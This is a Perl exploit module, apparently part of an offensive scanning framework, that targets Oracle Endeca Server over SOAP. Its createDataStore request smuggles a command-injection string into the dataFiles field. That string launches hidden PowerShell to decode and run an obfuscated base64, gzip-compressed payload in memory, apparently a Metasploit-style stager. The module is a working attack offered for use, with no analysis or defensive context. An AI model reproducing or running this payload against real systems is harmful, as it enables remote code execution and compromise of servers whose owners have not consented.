package P1rK3r::Exploits::ORACLE::MSF::OracleEndecaExec;
use parent qw(P1rK3r::Exploit P1rK3r::Services::ORACLE);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

use P1rK3r::Functions::Basic;
use P1rK3r::Functions::Errors;
use P1rK3r::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "OracleEndecaExec";

   my $DETECTION = {

   };

   my $EXPLOIT = {
        TYPE => 'MSF',
        PLATFORM => 'WINDOWS',
        REQUESTS => {
                EXPLOIT1 => {
                        METHOD       => 'POST',
                        PATH         => '',
                        PAYLOAD      => '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns="http://www.endeca.com/endeca-server/control/1/0">
   <soapenv:Header/>
   <soapenv:Body>
      <ns:createDataStore>
         <ns:dataStoreConfig>
            <ns:name>sToO</ns:name>
            <ns:dataFiles>c:\&#x22;&#x26; %COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -noni -c "if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &#x26;([scriptblock]::create((New-Object IO.StreamReader(New-Object IO.Compression.GzipStream((New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAAhnCloCA7VVbU/bSBD+DBL/YVVZ8loyVoC2okhIFwKhSE0aagrcudFpscfJXta76e46xdfrf79Zv5QgoKUnnRUp69l5fZ6ZcV7K1HIlSWV0dUq+bm1uTJhmBaFevv/3bki8fB5sbKDYE7+TQ0KT/nJ5rArG5fTgYFBqDdI279Ep2L4xUNwIDoYG5B9yNQcN2+9v/oLUkq/E+zM6FeqGiVatGrB0DmS7LzN3906lzOUSxUvBLfU/ffKDZHtnGp18Lpkw1I8rY6GIMiH8gHwLXMCLagnUH/FUK6NyG11xubcbfZSG5TBGbysYgZ2rzPgB1oA/DbbUkmA1zry5pD4eJ1ql/SzTYFA3OpMrtQDqyVKIkPxGkzb2h1JaXgDeW9BqGYNe8RRM9JbJTMAHyKd0DF+6kp9rRNeNUGtidRAiBQ+SHKmsFNDY+cHDNGvSAnwa4rDmb1ubW5t5x/Li1dX5Osl42kjqM2BqdKIMr/UOSS8kIwzDrNIVvnoXuoRgShIHeDKdEk8OwqetdzpVVKxeX6MkuVQ8m6JFy4OnFk76dDcdQ84lHFeSFTztGoY+hi7kAuryok5tjBlRv72A7BgEzJh1iIUkeWh2UnD73fao5CID3U+RIYNZIXnB/WQaEqh/JkdQIDzNu+8gxzaFTrttzaqL7t5RyR8IZkxIJiXOSRqSGJiALCR9aXh71S+tqo/+XbqjUlieMmM7d9OgQbGNNlDSWF2myBdWfhEvIeVMOCBC8pZncFTFfNZF9R+FYcCE4HKGnlZIA0pc+bF1XaAxQWQ8iGKwZ8VSQIEa9bAOBZvhaLYtXjcNm0Hm38+ua+GmXx0KXflruSG1sVA2JJdcW5x4hyg2z3+JvDbomMNAQ4s/7SYiOaqs62PvdhfGrhFbOOritcXCh1oVR8zA65ex1QgLfXG98+b8/FKMLnrDk+ud/cMXLhKG8uSb1c2aj6fGfcS0mTOBvnGSOxqHSg/b6Zwo7iwobXbxArQEgdsM910HSV8IlbrVUA8yrqVmWUyRz4943Nt99BSQ74rB3dLoRAcHf2CaiLKDInoHcmbnYe92r9fDHdC7fdnDMp9f2kAtK1q7Ct0OqbHpfIvad+Dw9xb7/zNiLelz/Mt+htid7Ae3z0KxFzYVPxDfF/wSpL9e+xXjFlVjbFsBzbZ8HIK2P9a+JIt95D5vH/cNf1/a7TF+Xv4FvBhCLioIAAA=''))),[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);" &#x26;&#x22;</ns:dataFiles>
         </ns:dataStoreConfig>
      </ns:createDataStore>
   </soapenv:Body>
</soapenv:Envelope>
',
                        TEXT         => 'Sending Exploit #1 Request : [POST] /',
                        HEADERS      => {
                           'SOAPAction' => '""',
                           'Content-Type' => 'text/xml; charset=utf-8',
                        },
                        VALIDATION   => {
                           TCODE => ['200'],
                        },
                },
        },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;
